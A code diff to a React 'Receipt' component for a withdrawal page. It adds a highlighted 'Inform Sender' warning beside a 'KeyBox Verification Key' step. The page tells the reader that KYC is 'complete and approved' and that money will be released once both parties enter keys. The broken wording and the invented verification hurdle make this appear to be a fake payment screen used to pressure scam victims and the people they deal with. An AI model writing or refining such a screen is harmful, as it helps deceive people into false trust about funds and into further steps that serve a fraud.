@@ -567,9 +567,17 @@ function Receipt() {
                   <KeyRound className="h-4 w-4 shrink-0 text-amber-600 dark:text-amber-400" />
                   <span>Action Required: Enter KeyBox Verification Key</span>
                 </div>
-                <p className="text-[11px] text-muted-foreground leading-relaxed">
-                  Your KYC identity verification is <strong>complete and approved</strong>! Enter the 5-digit verification key on the website and in this withdrawal tab. When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.
-                </p>
+                <div className="space-y-1.5 text-[11px] text-muted-foreground leading-relaxed">
+                  <p>
+                    Your KYC identity verification is <strong>complete and approved</strong>! Enter the 5-digit verification key on the website and in this withdrawal tab.
+                  </p>
+                  <p className="rounded-lg bg-amber-500/15 border border-amber-500/35 p-2 text-amber-900 dark:text-amber-200">
+                    ⚠️ <strong>Inform Sender:</strong> You have to inform the sender too to put the keys in their tab, <strong>or else it will not succeed</strong>.
+                  </p>
+                  <p>
+                    When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.
+                  </p>
+                </div>
 
                 {keySubmitted ? (
                   <div className="rounded-lg bg-emerald-500/10 border border-emerald-500/30 p-2.5 text-xs text-emerald-800 dark:text-emerald-300 space-y-1">
@@ -578,7 +586,7 @@ function Receipt() {
                       <span>Key Submitted · Verification in Progress</span>
                     </div>
                     <p className="text-[10px] text-muted-foreground leading-relaxed">
-                      Your verification key has been received. When both keys are put (on the website and here) and the correct key is verified, your money will be out for release without any extra verification.
+                      Your verification key has been received. Remember to also inform the sender to put the key in their tab (or else it will not succeed). When both keys are put and the correct key is verified, your money will be out for release without any extra verification.
                     </p>
                     <button
                       type="button"
